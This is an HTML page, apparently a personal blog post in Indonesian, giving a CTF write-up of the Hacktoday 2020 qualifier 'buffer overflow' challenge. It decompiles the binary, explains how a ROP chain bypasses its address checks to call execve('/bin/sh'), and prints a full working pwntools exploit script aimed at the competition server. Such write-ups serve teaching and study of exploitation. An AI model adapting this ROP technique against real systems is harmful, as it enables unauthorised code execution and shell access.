@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="Bintang Fikriguska ">
+<meta name="description" content="Overview Diberikan binary dengan proteksi sebagai berikut:
+Binary tersebut tersebut menampilkan tulisan &amp;ldquo;OK, I&amp;rsquo;ll give you buffer overflow&amp;rdquo; lalu meminta input maksimal 1000 byte dan terdapat beberapa pengecekan setiap 8 byte. Berikut hasil dekompilasi fungsi main:
+int __cdecl main(int argc, const char **argv, const char **envp) { signed __int64 v4; // [rsp&#43;0h] [rbp-50h]  int v5; // [rsp&#43;8h] [rbp-48h]  int v6; // [rsp&#43;Ch] [rbp-44h]  char buf[64]; // [rsp&#43;10h] [rbp-40h]  __int64 savedregs; // [rsp&#43;50h] [rbp&#43;0h]  memset(buf, 0, sizeof(buf)); v5 = 0; init(&amp;amp;savedregs, argv, buf); strcpy(str, &amp;#34;OK, I&amp;#39;ll give you buffer overflow&amp;#34;); puts(str); v6 = read(0, buf, 0x3E8uLL); while ( v6 / 8 !" />
+<meta name="keywords" content=", ctf, binary exploitation, hacktoday" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="#252627" />
+<link rel="canonical" href="https://fikriguska.github.io/posts/2020/08/hacktoday-2020-quals-buffer-overflow/" />
+
+
+    <title>
+        
+            Hacktoday 2020 (Quals) - buffer overflow :: Camelliose  — Hello Friend NG Theme
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet" type="text/css">
+
+
+
+<link rel="stylesheet" href="https://fikriguska.github.io/main.dede02da9537a98158079c023e83573e18127834838ef08172acce888341a797.css">
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://fikriguska.github.io/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://fikriguska.github.io/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://fikriguska.github.io/favicon-16x16.png">
+    <link rel="manifest" href="https://fikriguska.github.io/site.webmanifest">
+    <link rel="mask-icon" href="https://fikriguska.github.io/safari-pinned-tab.svg" color="#252627">
+    <link rel="shortcut icon" href="https://fikriguska.github.io/favicon.ico">
+    <meta name="msapplication-TileColor" content="#252627">
+    <meta name="theme-color" content="#252627">
+
+
+
+<meta itemprop="name" content="Hacktoday 2020 (Quals) - buffer overflow">
+<meta itemprop="description" content="Overview Diberikan binary dengan proteksi sebagai berikut:
+Binary tersebut tersebut menampilkan tulisan &ldquo;OK, I&rsquo;ll give you buffer overflow&rdquo; lalu meminta input maksimal 1000 byte dan terdapat beberapa pengecekan setiap 8 byte. Berikut hasil dekompilasi fungsi main:
+int __cdecl main(int argc, const char **argv, const char **envp) { signed __int64 v4; // [rsp&#43;0h] [rbp-50h]  int v5; // [rsp&#43;8h] [rbp-48h]  int v6; // [rsp&#43;Ch] [rbp-44h]  char buf[64]; // [rsp&#43;10h] [rbp-40h]  __int64 savedregs; // [rsp&#43;50h] [rbp&#43;0h]  memset(buf, 0, sizeof(buf)); v5 = 0; init(&amp;savedregs, argv, buf); strcpy(str, &#34;OK, I&#39;ll give you buffer overflow&#34;); puts(str); v6 = read(0, buf, 0x3E8uLL); while ( v6 / 8 !">
+<meta itemprop="datePublished" content="2020-08-12T00:40:58&#43;07:00" />
+<meta itemprop="dateModified" content="2020-08-12T00:40:58&#43;07:00" />
+<meta itemprop="wordCount" content="924">
+<meta itemprop="image" content="https://fikriguska.github.io"/>
+
+
+
+<meta itemprop="keywords" content="ctf,binary exploitation,hacktoday," />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://fikriguska.github.io"/>
+
+<meta name="twitter:title" content="Hacktoday 2020 (Quals) - buffer overflow"/>
+<meta name="twitter:description" content="Overview Diberikan binary dengan proteksi sebagai berikut:
+Binary tersebut tersebut menampilkan tulisan &ldquo;OK, I&rsquo;ll give you buffer overflow&rdquo; lalu meminta input maksimal 1000 byte dan terdapat beberapa pengecekan setiap 8 byte. Berikut hasil dekompilasi fungsi main:
+int __cdecl main(int argc, const char **argv, const char **envp) { signed __int64 v4; // [rsp&#43;0h] [rbp-50h]  int v5; // [rsp&#43;8h] [rbp-48h]  int v6; // [rsp&#43;Ch] [rbp-44h]  char buf[64]; // [rsp&#43;10h] [rbp-40h]  __int64 savedregs; // [rsp&#43;50h] [rbp&#43;0h]  memset(buf, 0, sizeof(buf)); v5 = 0; init(&amp;savedregs, argv, buf); strcpy(str, &#34;OK, I&#39;ll give you buffer overflow&#34;); puts(str); v6 = read(0, buf, 0x3E8uLL); while ( v6 / 8 !"/>
+
+
+
+    <meta property="og:title" content="Hacktoday 2020 (Quals) - buffer overflow" />
+<meta property="og:description" content="Overview Diberikan binary dengan proteksi sebagai berikut:
+Binary tersebut tersebut menampilkan tulisan &ldquo;OK, I&rsquo;ll give you buffer overflow&rdquo; lalu meminta input maksimal 1000 byte dan terdapat beberapa pengecekan setiap 8 byte. Berikut hasil dekompilasi fungsi main:
+int __cdecl main(int argc, const char **argv, const char **envp) { signed __int64 v4; // [rsp&#43;0h] [rbp-50h]  int v5; // [rsp&#43;8h] [rbp-48h]  int v6; // [rsp&#43;Ch] [rbp-44h]  char buf[64]; // [rsp&#43;10h] [rbp-40h]  __int64 savedregs; // [rsp&#43;50h] [rbp&#43;0h]  memset(buf, 0, sizeof(buf)); v5 = 0; init(&amp;savedregs, argv, buf); strcpy(str, &#34;OK, I&#39;ll give you buffer overflow&#34;); puts(str); v6 = read(0, buf, 0x3E8uLL); while ( v6 / 8 !" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://fikriguska.github.io/posts/2020/08/hacktoday-2020-quals-buffer-overflow/" />
+<meta property="og:image" content="https://fikriguska.github.io"/>
+<meta property="article:published_time" content="2020-08-12T00:40:58+07:00" />
+<meta property="article:modified_time" content="2020-08-12T00:40:58+07:00" />
+
+
+
+
+
+
+    <meta property="article:published_time" content="2020-08-12 00:40:58 &#43;0700 WIB" />
+
+
+
+
+
+
+
+
+    </head>
+
+    <body class="dark-theme">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://fikriguska.github.io/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">~</span>
+            
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://fikriguska.github.io/about/">About</a></li><li><a href="https://fikriguska.github.io/posts/">Posts</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+            <span class="theme-toggle unselectable"></span>
+
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+<style>
+.post-content .img{
+	text-align: center;
+}
+</style>
+    <main class="post">
+
+        <div class="post-info">
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>5 minutes
+
+            
+
+            </p>
+        </div>
+
+        <article style="text-align: justify">
+            <h1 class="post-title">
+                <a href="https://fikriguska.github.io/posts/2020/08/hacktoday-2020-quals-buffer-overflow/">Hacktoday 2020 (Quals) - buffer overflow</a>
+            </h1>
+
+            
+
+            <div class="post-content">
+                <h2 id="overview">Overview</h2>
+<p>Diberikan binary dengan proteksi sebagai berikut:</p>
+<p><img src="https://fikriguska.github.io/img/buffer-overflow-1.png" alt="image alt text"></p>
+<p>Binary tersebut tersebut menampilkan tulisan &ldquo;OK, I&rsquo;ll give you buffer overflow&rdquo; lalu meminta input maksimal 1000 byte dan terdapat beberapa pengecekan setiap 8 byte. Berikut hasil dekompilasi fungsi <code>main</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
+{
+  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">__int64</span> v4; <span style="color:#75715e">// [rsp+0h] [rbp-50h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v5; <span style="color:#75715e">// [rsp+8h] [rbp-48h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v6; <span style="color:#75715e">// [rsp+Ch] [rbp-44h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">64</span>]; <span style="color:#75715e">// [rsp+10h] [rbp-40h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> savedregs; <span style="color:#75715e">// [rsp+50h] [rbp+0h]
+</span><span style="color:#75715e"></span>
+  memset(buf, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(buf));
+  v5 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+  init(<span style="color:#f92672">&amp;</span>savedregs, argv, buf);
+  strcpy(str, <span style="color:#e6db74">&#34;OK, I&#39;ll give you buffer overflow&#34;</span>);
+  puts(str);
+  v6 <span style="color:#f92672">=</span> read(<span style="color:#ae81ff">0</span>, buf, <span style="color:#ae81ff">0x3E8uLL</span>);
+  <span style="color:#66d9ef">while</span> ( v6 <span style="color:#f92672">/</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">!=</span> v5 )
+  {
+    v4 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>buf[<span style="color:#ae81ff">8</span> <span style="color:#f92672">*</span> v5];
+    <span style="color:#66d9ef">if</span> ( v4 <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">255</span> <span style="color:#f92672">&amp;&amp;</span> v4 <span style="color:#f92672">&lt;</span> (<span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">__int64</span>)maybe_you_need_this
+      <span style="color:#f92672">||</span> v4 <span style="color:#f92672">&gt;</span> (<span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">__int64</span>)etext <span style="color:#f92672">&amp;&amp;</span> v4 <span style="color:#f92672">&lt;</span> (<span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>_bss_start
+      <span style="color:#f92672">||</span> v4 <span style="color:#f92672">&gt;</span> (<span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>end )
+    {
+      puts(<span style="color:#e6db74">&#34;restricted.&#34;</span>);
+      exit(<span style="color:#ae81ff">1</span>);
+    }
+    <span style="color:#f92672">++</span>v5;
+  }
+  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p>binary tersebut juga disediakan gadget tambahan seperti pop rdx dan juga syscall.</p>
+<p>Terlihat beberapa pengecekan:</p>
+<ol>
+<li>v4 &gt; 255 &amp;&amp; v4 &lt; (signed __int64)maybe_you_need_this</li>
+<li>v4 &gt; (signed __int64)etext &amp;&amp; v4 &lt; (signed __int64)&amp;_bss_start</li>
+<li>v4 &gt; (signed __int64)&amp;end )</li>
+</ol>
+<p>Atau jika ditulis menggunakan alamat akan seperti:</p>
+<ol>
+<li>255 &lt; v4 &lt; 0x0000000004006B6</li>
+<li>0x000000000040090D &lt; v4 &lt; 0x0000000000601058</li>
+<li>v4 &gt; 0x0000000006010B0</li>
+</ol>
+<p>Itulah yang tidak boleh kita tulis setiap 8 byte pada array, dengan adanya pengecekan tersebut kita tidak bisa menulis PLT, GOT, dan libc address.</p>
+<h2 id="vulnerability">Vulnerability</h2>
+<p>Sesuai nama soal, iya, buffer overflow wkwkw</p>
+<h2 id="exploit">Exploit</h2>
+<p>Exploit yang kita akan lakukan adalah memanggil execve(&quot;/bin/sh&rdquo;, 0, 0). Namun karena kita tidak bisa menulis /bin/sh, kita harus mencari cara agar lolos pengecekan. Caranya yaitu dengan memanggil fungsi <code>read</code> yang berada pada fungsi main (0x00000000004007E7). Untuk setup argumennya dapat dilakukan dengan menggunakan beberapa gadget yang lolos pengecekan yaitu pop rdi (0x00000000004008f3), pop rsi (0x00000000004008f1), dan pop rdx (0x00000000004006ba). Pada sebelum memanggil <code>read</code>, di payload kita tambahkan untuk mengubah base pointer ke bss (0x0000000006010a8) karena address diketahui dan juga lolos pengecekan. Kenapa base pointer diubah? karena kita akan memanggil <code>read</code> lagi untuk mengoverwrite rbp-0x48 (<code>v5</code>) yang merupakan counter pada saat pengecekan berlangsung dan akan diubah dengan nilai panjang string (payload) dibagi 8, supaya tidak ada pengecekan sama sekali dan kita dapat dengan mudah memasukkan string /bin/sh didalamnya.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    rbp <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000006010a8</span>
+    read <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000004007E7</span>
+    pop_rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004008f3</span>
+    pop_rsi_r15 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004008f1</span>
+    pop_rdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004006ba</span>
+    syscall <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004006bc</span>
+
+    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">64</span>
+    payload <span style="color:#f92672">+=</span> p64(rbp)
+    payload <span style="color:#f92672">+=</span> p64(pop_rdi)
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
+    payload <span style="color:#f92672">+=</span> p64(pop_rsi_r15)
+    payload <span style="color:#f92672">+=</span> p64(rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x48</span>)
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
+    payload <span style="color:#f92672">+=</span> p64(pop_rdx)
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">200</span>)
+    payload <span style="color:#f92672">+=</span> p64(read)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;flow</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, payload)
+</code></pre></div><p>berikut kondisi setelah payload dikirim dan tepat sebelum pemanggilan <code>read</code> kedua:</p>
+<pre><code>│0x0000000000601060│+0x0000   0x00007faada9a9620 &lt;- rbp - 0x48 (v5)
+│0x0000000000601068│+0x0008   0x0000000000000000   
+│0x0000000000601070│+0x0010   0x00007faada9a88e0   
+│0x0000000000601078│+0x0018   0x0000000000000000   
+│0x0000000000601080│+0x0020   0x6c6c2749202c4b4f   
+│0x0000000000601088│+0x0028   0x6f79206576696720   
+│0x0000000000601090│+0x0030   0x7265666675622075   
+│0x0000000000601098│+0x0038   0x6f6c667265766f20   
+│0x00000000006010a0│+0x0040   0x0000000000000077   
+│0x00000000006010a8│+0x0048   0x0000000000000000 &lt;- rbp 
+</code></pre><p>kita akan membuat payload yang mengoverwrite rbp-0x48 pada saat <code>read</code> kedua sekaligus setup untuk pemanggilan execve(&quot;/bin/sh&rdquo;, 0, 0). Tetapi bagaimana set nilai raxnya? Disini saya menyediakan suatu fungsi yang memiliki nilai keluaran yang mana hal tersebut bisa digunakan untuk setup nilai rax, yaitu fungsi <code>what</code>. Berikut hasil dekompilasinya:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">what</span>(<span style="color:#66d9ef">int</span> a1, <span style="color:#66d9ef">int</span> a2)
+{
+  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">int</span> v2; <span style="color:#75715e">// eax
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">int</span> i; <span style="color:#75715e">// [rsp+14h] [rbp-4h]
+</span><span style="color:#75715e"></span>
+  v2 <span style="color:#f92672">=</span> a1;
+  <span style="color:#66d9ef">if</span> ( a2 <span style="color:#f92672">&gt;=</span> a1 )
+    v2 <span style="color:#f92672">=</span> a2;
+  <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> v2; i <span style="color:#f92672">%</span> a1 <span style="color:#f92672">||</span> i <span style="color:#f92672">%</span> a2; <span style="color:#f92672">++</span>i )
+    ;
+  <span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)i;
+}
+</code></pre></div><p>Hmm jika diteliti lagi itu merupakan fungsi KPK (Lho kok naronya fungsi KPK??? ya karena pengen wkwkwk). Jadi untuk memanggil execve kita harus set nilai rax menjadi 59, berarti kita harus setup argumen-argumen fungsi <code>what</code> menjadi 59 dan 1 atau 59 dan 59.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/bin/sh&#39;</span><span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0x48</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)
+    payload <span style="color:#f92672">+=</span> p64(pop_rdi)
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">1</span>)
+    payload <span style="color:#f92672">+=</span> p64(pop_rsi_r15)
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">59</span>)
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
+    payload <span style="color:#f92672">+=</span> p64(elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;what&#39;</span>])
+    payload <span style="color:#f92672">+=</span> p64(pop_rdi)
+    payload <span style="color:#f92672">+=</span> p64(rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x40</span>)
+    payload <span style="color:#f92672">+=</span> p64(pop_rsi_r15)
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
+    payload <span style="color:#f92672">+=</span> p64(pop_rdx)
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
+    payload <span style="color:#f92672">+=</span> p64(syscall)
+</code></pre></div><p>karena mengingat kita harus overwrite rbp-0x48 (<code>v5</code>), pada awal payload kita taruh panjang payload dibagi 8.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    counter <span style="color:#f92672">=</span> len(payload) <span style="color:#f92672">/</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
+    payload <span style="color:#f92672">=</span> p64(counter) <span style="color:#f92672">+</span> payload
+    p<span style="color:#f92672">.</span>sendline(payload)
+</code></pre></div><p>setelah payload dikirim akan menjadi:</p>
+<pre><code>│0x0000000000601060│+0x0000   0x0000000000000018 &lt;- rbp-0x48 (v5)
+│0x0000000000601068│+0x0008   0x0068732f6e69622f (&quot;/bin/sh&quot;)
+│0x0000000000601070│+0x0010   0x0000000000000000   
+│0x0000000000601078│+0x0018   0x0000000000000000   
+│0x0000000000601080│+0x0020   0x0000000000000000   
+│0x0000000000601088│+0x0028   0x0000000000000000   
+│0x0000000000601090│+0x0030   0x0000000000000000   
+│0x0000000000601098│+0x0038   0x0000000000000000   
+│0x00000000006010a0│+0x0040   0x0000000000000000   
+│0x00000000006010a8│+0x0048   0x0000000000000000 &lt;- rbp
+</code></pre><p>nilai 0x18 akan sama dengan panjang payload dibagi 8, dan <code>while ( v6 / 8 != v5 )</code> akan bernilai false yang artinya tidak akan ada pengecekan sama sekali. Dengan begitu ropchain untuk pemanggilan execve(&quot;/bin/sh&rdquo;, 0, 0) akan sukses.</p>
+<h2 id="full-exploit-code">Full Exploit Code</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">import</span> sys
+
+BINARY <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./chall&#39;</span>
+
+con <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;nc chall.codepwnda.id 17013&#39;</span>
+
+<span style="color:#66d9ef">if</span>(con):
+    con <span style="color:#f92672">=</span> con<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; &#39;</span>)
+    HOST <span style="color:#f92672">=</span> con[<span style="color:#ae81ff">1</span>]
+    PORT <span style="color:#f92672">=</span> con[<span style="color:#ae81ff">2</span>]
+
+elf <span style="color:#f92672">=</span> ELF(BINARY, checksec<span style="color:#f92672">=</span>False)
+argv <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv
+<span style="color:#75715e"># context.terminal = &#39;gnome-terminal -e&#39;.split()</span>
+context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;tmux splitw -h -p 70&#39;</span><span style="color:#f92672">.</span>split()
+<span style="color:#75715e">#context.log_level = &#39;DEBUG&#39;</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>():
+
+    rbp <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000006010a8</span>
+    read <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000004007E7</span>
+    pop_rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004008f3</span>
+    pop_rsi_r15 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004008f1</span>
+    pop_rdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004006ba</span>
+    syscall <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004006bc</span>
+    
+    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">64</span>
+    payload <span style="color:#f92672">+=</span> p64(rbp)
+    payload <span style="color:#f92672">+=</span> p64(pop_rdi)
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
+    payload <span style="color:#f92672">+=</span> p64(pop_rsi_r15)
+    payload <span style="color:#f92672">+=</span> p64(rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x48</span>)
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
+    payload <span style="color:#f92672">+=</span> p64(pop_rdx)
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">200</span>)
+    payload <span style="color:#f92672">+=</span> p64(read)
+    
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;flow</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, payload)
+
+    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/bin/sh&#39;</span><span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0x48</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)
+    payload <span style="color:#f92672">+=</span> p64(pop_rdi)
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">1</span>)
+    payload <span style="color:#f92672">+=</span> p64(pop_rsi_r15)
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">59</span>)
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
+    payload <span style="color:#f92672">+=</span> p64(elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;what&#39;</span>])
+    payload <span style="color:#f92672">+=</span> p64(pop_rdi)
+    payload <span style="color:#f92672">+=</span> p64(rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x40</span>)
+    payload <span style="color:#f92672">+=</span> p64(pop_rsi_r15)
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
+    payload <span style="color:#f92672">+=</span> p64(pop_rdx)
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
+    payload <span style="color:#f92672">+=</span> p64(syscall)
+    
+    counter <span style="color:#f92672">=</span> len(payload) <span style="color:#f92672">/</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
+
+    payload <span style="color:#f92672">=</span> p64(counter) <span style="color:#f92672">+</span> payload
+
+    p<span style="color:#f92672">.</span>sendline(payload)
+
+    p<span style="color:#f92672">.</span>interactive()
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+
+    p <span style="color:#f92672">=</span> process(BINARY)
+
+    <span style="color:#66d9ef">if</span> len(argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>:
+        <span style="color:#66d9ef">if</span> argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;d&#39;</span>:
+            p <span style="color:#f92672">=</span> remote(HOST, PORT)
+        <span style="color:#66d9ef">else</span>:
+            cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
+</span><span style="color:#e6db74">            &#39;&#39;&#39;</span>
+            gdb<span style="color:#f92672">.</span>attach(p, cmd)
+    exploit()
+</code></pre></div><p><img src="https://fikriguska.github.io/img/buffer-overflow-2.png" alt="image alt text"></p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+                <p>
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="https://fikriguska.github.io/tags/ctf">ctf</a></span><span class="tag"><a href="https://fikriguska.github.io/tags/binary-exploitation">binary exploitation</a></span><span class="tag"><a href="https://fikriguska.github.io/tags/hacktoday">hacktoday</a></span>
+                </p>
+
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>924 Words</p>
+
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2020-08-12 00:40 &#43;0700</p>
+        </div>
+
+        
+            <div class="pagination">
+                <div class="pagination__title">
+                    <span class="pagination__title-h"></span>
+                    <hr />
+                </div>
+
+                <div class="pagination__buttons">
+                    
+
+                    
+                        <span class="button next">
+                            <a href="https://fikriguska.github.io/posts/2020/08/hacktoday-2020-quals-no-free/">
+                                <span class="button__text">Hacktoday 2020 (Quals) - no free</span>
+                                <span class="button__icon">→</span>
+                            </a>
+                        </span>
+                    
+                </div>
+            </div>
+        
+            <div id="comments" class="thin">
+                <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "fikriguska" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
